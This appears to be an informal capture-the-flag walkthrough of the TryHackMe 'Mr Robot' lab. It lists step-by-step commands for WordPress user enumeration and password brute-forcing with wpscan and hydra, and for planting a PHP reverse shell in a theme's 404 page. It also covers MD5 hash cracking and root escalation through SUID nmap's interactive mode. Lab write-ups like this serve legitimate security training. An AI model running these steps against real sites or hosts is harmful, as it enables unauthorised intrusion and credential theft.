                                                                                                                                    This is a walkthrough of how how solved the Mr Robot CTF on TryHackMe 

1. Connect With the TryHackMe server using Command  $ sudo openvpn Downloads/Ynos.ovpn
2. Confirm You can Connect to the Machine using the command $ ping (Ip of the machine)
3. Start by Scanning for Open Ports Using Nmap $nmap -sV -O -T5 -p- (Ip of the machine) -oN nmap.results
4. open the website of this machine and do $ip/robots.txt  and some files will open
5. Start dirbuster on this website 
6. Out of these Use the key download the fsocity.dic by right click and then select save page as.
7. now we will shorten this wordlist by removing copy elements using command $cat fsocity.dic | sort | uniq > main.dic sorts fsocity.dic and creates a new file main that contains unique elements
8. from dirbuster we found that this uses wordpress thus we will try ip/wp-login on website
9. now we will try to find login id and password for this website using wpscan using command $ wpscan --url http://10.10.49.119(website ip) -eu Spolier no usernames
10. we will use burp suite and put wrong pass so that burp analyzez the way request is sent through and we can copy that and paste in hydra to specify where to put id and pass 
11. we will try to brute force the username using hydra and the fsocity fily we downloaded command $hydra -L main.dic -p test 10.10.49.119 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30  
12. we get three recommendation for the username elliot,Elliot,ELLIOT
13. now for bruteforce we can either use hydra again or wps scan
14. hydra Command $ Okay so this actually did'nt work and it showed 0 valid password found
15. wps scan Command $wpscan --url http://10.10.49.119 -U Elliot -P main.dic --password-attack wp-login -t 100 -o wpscan.results
16. now we will open the editor part of the website and in 404 update a malicious php reverse shell code downloaded from pentestmonkey and in the ip part we will give our ip  so when we access an invalid page from our website it will start sending signals to our port 
17. we will start listesing on port 4444 using command $nc -nlvp 4444
18. run the wordpress website such that it gives  404 error
19. and it just gives you the access to the shell
20. now we will find our way throught files and go to /home then robot then find password.raw-md5 which will have password in hashed form
21. we willl crack this hash using crackstation
22. now gain access to robot user using su robot and pass i.e abcdefghijklmnopqrstuvwxyz 
23.suid-bit files in linux are files than can be accessed by guest user at root user with permissiion of root user
24. now we use the command $find / -perm -u=s -type f 2>/dev/null to find suid files in linux 
25. we find that nmap can be used a root user by the guest user
26. we will use nmap with interactive mode using command $nmap --interactive
27. type sh and you will gain access to root shell 
28. voila now just find the last key
29. it is in root/key-3-of-3.txt 
30. and voila you have completed the machine , this was a tough one but i finished it with some help
